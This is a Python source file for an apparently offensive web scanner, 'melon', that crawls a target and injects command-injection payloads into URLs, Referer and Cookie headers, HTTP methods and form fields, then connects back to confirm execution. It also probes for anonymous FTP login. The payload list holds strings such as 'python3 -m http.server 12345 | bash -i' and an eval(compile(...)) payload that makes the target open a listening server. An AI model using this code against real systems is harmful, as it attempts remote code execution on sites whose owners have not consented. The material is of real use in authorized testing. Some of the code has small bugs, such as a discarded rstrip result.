import re
import socket
import time
import urllib.parse
from ftplib import FTP,FTP_TLS
from urllib.parse import *
import TheSilent.kitten_crawler as kitten_crawler
import TheSilent.puppy_requests as puppy_requests
from TheSilent.clear import clear
from TheSilent.return_user_agent import return_user_agent

RED = "\033[1;31m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"

mal_reverse_shell = ["eval(compile('import http.server,socketserver\nsimple_server = http.server.SimpleHTTPRequestHandler\nwith socketserver.TCPServer((\'\',12345), simple_server) as httpd:\n    httpd.serve_forever()','melon','exec'))",
                     "eval(compile('import http.server,socketserver\nsimple_server = http.server.SimpleHTTPRequestHandler\nwith socketserver.TCPServer((\'\',7777), simple_server) as httpd:\n    httpd.serve_forever()','melon','exec'))",
                     "python3 -m http.server 12345 | bash -i",
                     "python3 -m http.server 7777 | bash -i",
                     "python -m http.server 12345 | bash -i",
                     "python -m http.server 7777 | bash -i",
                     "python3 -m http.server 12345 & bash -i",
                     "python3 -m http.server 7777 & bash -i",
                     "python -m http.server 12345 & bash -i",
                     "python -m http.server 7777 & bash -i",
                     "python3 -m http.server 12345 && bash -i",
                     "python3 -m http.server 7777 && bash -i",
                     "python -m http.server 12345 && bash -i",
                     "python -m http.server 7777 && bash -i"]
    
def melon(host,delay=0,crawl=False):
    host.rstrip("/")
    init_host = host
    print(CYAN + "")
    clear()
    all_forms = []
    hits = []

    if crawl:
        hosts = kitten_crawler.kitten_crawler(init_host,delay)

    else:
        hosts = [init_host]

    for host in hosts:
        try:
            original_page = puppy_requests.text(host)
            all_forms = re.findall("<form[\S\s\n]+/form>",original_page)
        except:
            pass

        # check for reverse shell in url
        print(CYAN + f"checking for reverse shell in url on {host}")
        for mal in mal_reverse_shell:
            try:
                time.sleep(delay)
                data = puppy_requests.text(host + "/" + urllib.parse.quote_plus(mal))
                tcp_reverse_shell = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                tcp_reverse_shell.settimeout(10)
                port = int(re.findall("\d{4,}",mal)[0])
                tcp_reverse_shell.connect((urllib.parse.urlparse(init_host).netloc,port))
                hits.append(f"reverse shell in url ({host}): {mal}")
            except:
                pass
            

        # check for reverse shell in header
        print(CYAN + f"checking for reverse shell in header on {host}")
        for mal in mal_reverse_shell:
            try:
                time.sleep(delay)
                data = puppy_requests.text(host,headers={"Referer":mal})
                tcp_reverse_shell = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                tcp_reverse_shell.settimeout(10)
                port = int(re.findall("\d{4,}",mal)[0])
                tcp_reverse_shell.connect((urllib.parse.urlparse(init_host).netloc,port))
                hits.append(f"reverse shell in header ({host}): {mal}")
            except:
                pass

        # check for reverse shell in cookie
        print(CYAN + f"checking for reverse shell in cookie on  on {host}")
        for mal in mal_reverse_shell:
            try:
                time.sleep(delay)
                data = puppy_requests.text(host,headers={"Cookie":mal})
                tcp_reverse_shell = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                tcp_reverse_shell.settimeout(10)
                port = int(re.findall("\d{4,}",mal)[0])
                tcp_reverse_shell.connect((urllib.parse.urlparse(init_host).netloc,port))
                hits.append(f"reverse shell in cookie ({host}): {mal}")
            except:
                pass

        # check for reverse shell in method
        print(CYAN + f"checking for reverse shell in method on {host}")
        for mal in mal_reverse_shell:
            try:
                time.sleep(delay)
                data = puppy_requests.text(host,method=mal.upper())
                tcp_reverse_shell = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                tcp_reverse_shell.settimeout(10)
                port = int(re.findall("\d{4,}",mal)[0])
                tcp_reverse_shell.connect((urllib.parse.urlparse(init_host).netloc,port))
                hits.append(f"reverse shell in method ({host}): {mal}")
            except:
                pass

        # check for reverse shell in forms
        print(CYAN + f"checking for reverse shell in forms on {host}")
        for mal in mal_reverse_shell:
            if len(all_forms) > 0:
                for form in all_forms:
                    time.sleep(delay)
                    action_bool = True
                    form_names = []
                    mal_value = []
                    try:
                        form_method = re.findall("method\s?=\s?[\"\'](\S+)[\"\']",form)[0]
                        form_input = re.findall("<input.+>",form)
                        for field in form_input:
                            form_name = re.findall("name\s?=\s?[\"\'](\S+)[\"\']",field)[0]
                            form_type = re.findall("type\s?=\s?[\"\'](\S+)[\"\']",field)[0]
                            form_names.append(form_name)
                            if form_type.lower() == "button" or form_type.lower() == "hidden"  or form_type.lower() == "submit":
                                mal_value.append(re.findall("value\s?=\s?[\"\'](\S+)[\"\']",field)[0])

                            else:
                                mal_value.append(mal)

                    except IndexError:
                        pass

                    try:
                        action_tag = re.findall("action\s?=\s?[\"\'](\S+)[\"\']",form)[0]
                        if action_tag.startswith("https://") or action_tag.startswith("http://"):
                            action = action_tag
                        if action_tag.startswith("/"):
                            action = host + action_tag
                        else:
                            action = urllib.parse.urlparse(host).scheme + "://" + urllib.parse.urlparse(host).netloc + "/" + action_tag
                    except IndexError:
                        action_bool = False

                    if action_bool:
                        try:
                            data = puppy_requests.text(action,method=form_method.upper(),data=dict(zip(form_names,mal_value)))
                            tcp_reverse_shell = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                            tcp_reverse_shell.settimeout(10)
                            port = int(re.findall("\d{4,}",mal)[0])
                            tcp_reverse_shell.connect((urllib.parse.urlparse(init_host).netloc,port))
                            hits.append(f"reverse shell in forms ({action}): {dict(zip(form_names,mal_value))}")
                        except:
                            pass

                    else:
                        try:
                            data = puppy_requests.text(host,method=form_method.upper(),data=dict(zip(form_names,mal_value)))
                            tcp_reverse_shell = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                            tcp_reverse_shell.settimeout(10)
                            port = int(re.findall("\d{4,}",mal)[0])
                            tcp_reverse_shell.connect((urllib.parse.urlparse(init_host).netloc,port))
                            hits.append(f"reverse shell in forms ({host})- {dict(zip(form_names,mal_value))}")
                        except:
                            pass

    # check for anonymous ftp bind
    print(CYAN + f"checking for anonymous ftp bind on {host}")
    try:
        ftp = FTP(urllib.parse.urlparse(host).netloc,timeout=10)
        ftp.login()
        ftp.quit()
        hits.append(f"anonymous ftp bind allowed on {host}")
    except:
        pass

    # check for anonymous secure ftp bind
    print(CYAN + f"checking for secure anonymous ftp bind on {host}")
    try:
        ftp = FTP_TLS(urllib.parse.urlparse(host).netloc,timeout=10)
        ftp.login()
        ftp.quit()
        hits.append(f"secure anonymous ftp bind allowed on {host}")
    except:
        pass

    hits = list(set(hits[:]))
    hits.sort()
    clear()
    if len(hits) > 0:
        with open(urllib.parse.urlparse(init_host).netloc,"a") as file:
            for hit in hits:
                file.write(f"{hit}\n")
        for hit in hits:
            print(RED + hit)
    else:
        with open(urllib.parse.urlparse(init_host).netloc,"a") as file:
            file.write("None\n")
        print(GREEN + "None")
